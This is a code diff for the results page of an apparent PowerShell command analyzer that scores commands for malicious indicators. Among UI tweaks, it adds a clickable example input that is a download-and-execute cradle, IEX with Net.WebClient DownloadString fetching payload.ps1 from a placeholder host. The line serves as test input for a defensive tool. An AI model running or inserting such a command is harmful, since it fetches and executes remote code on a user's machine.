@@ -76,6 +76,7 @@ export default function AnalysisDetailsPage() {
       const analysisResult = analysis.analysis_result || analysis;
       
       setCmd(analysis.command || analysisResult.command);
+      setNewCommand(analysis.command || analysisResult.command);
       
       const processedResult = {
         score: analysis.risk_score || analysisResult.risk_score || 0,
@@ -305,23 +306,23 @@ export default function AnalysisDetailsPage() {
               value={newCommand}
               onChange={(e) => setNewCommand(e.target.value)}
               onSubmit={handleNewAnalysis}
-              placeholder="Enter a new PowerShell command.."
+              placeholder="Type or paste a PS payload..."
               disabled={loading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
             />
           </div>
-          <button
+          <ThemedButton
             onClick={handleNewAnalysis}
             disabled={!newCommand.trim() || loading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
-            className="px-6 py-3 rounded-lg font-mono font-bold text-sm transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed flex-shrink-0 bg-black/80 border border-green-500/30 hover:border-green-500/50 hover:shadow-[0_0_15px_rgba(34,197,94,0.3)] cursor-pointer"
-            style={{
-              color: 'var(--accent)'
-            }}
+            className="flex-shrink-0"
+            loading={loading}
           >
             {loading ? 'Analyzing...' : 'Evaluate'}
-          </button>
+          </ThemedButton>
         </div>
         <InfoMessage 
-          message={!error && newCommand.trim() === "" ? "Examples: Get-Process | Where-Object CPU -gt 100 | Select Name, CPU" : ""}
+          message={!error && newCommand.trim() === "" ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
+          clickable={!error && newCommand.trim() === ""}
+          onClick={() => setNewCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
         />
           </div>
           
@@ -380,14 +381,6 @@ export default function AnalysisDetailsPage() {
           </div>
         )}
 
-       <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg border bg-black/80 border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_30px_rgba(34,197,94,0.3)] cursor-pointer">
-         <div className="font-mono text-xs sm:text-sm mb-2" style={{color: 'var(--muted-foreground)'}}>Command evaluated:</div>
-         <div className="flex items-start">
-           <span className="font-mono text-sm sm:text-base break-all" style={{color: 'var(--foreground)'}}>
-             {cmd}
-                </span>
-              </div>
-            </div>
 
      
       {result && (
@@ -409,7 +402,7 @@ export default function AnalysisDetailsPage() {
               {totalScore === 0 ? "No Malicious Indicators Detected" : "Cumulative score from all patterns"}
             </div>
             {result.signatures && result.signatures.length > 0 && (
-              <div className="text-xs font-mono text-gray-400 border-t border-gray-600 pt-3 mt-3">
+              <div className="text-xs font-mono text-gray-400  pt-3 mt-3">
                 {(() => {
                   const securitySigs = result.signatures.filter(sig => 
                     !sig.name.includes('(') || sig.score >= 4.0 || !sig.techniques?.includes('T1059.001') || sig.tactics?.length > 1
@@ -423,7 +416,6 @@ export default function AnalysisDetailsPage() {
                   
                   return (
                     <>
-                                             {securityScore > 0 && <div>Security Patterns: {securityScore.toFixed(1)}</div>}
                       {allCmdletScore > 0 && <div>PowerShell Cmdlets: {allCmdletScore.toFixed(1)}</div>}
                     </>
                   );
@@ -465,7 +457,7 @@ export default function AnalysisDetailsPage() {
                 {realSignatures.length > 0 && (
           <div className="mb-6">
                                          <h2 className="text-lg sm:text-xl font-mono font-bold mb-4" style={{color: 'var(--foreground)'}}>
-                       Indicator Regex
+                       Indicators Breakdown
             </h2>
                     <div className="space-y-4">
                       {realSignatures.map((signature, index) => (
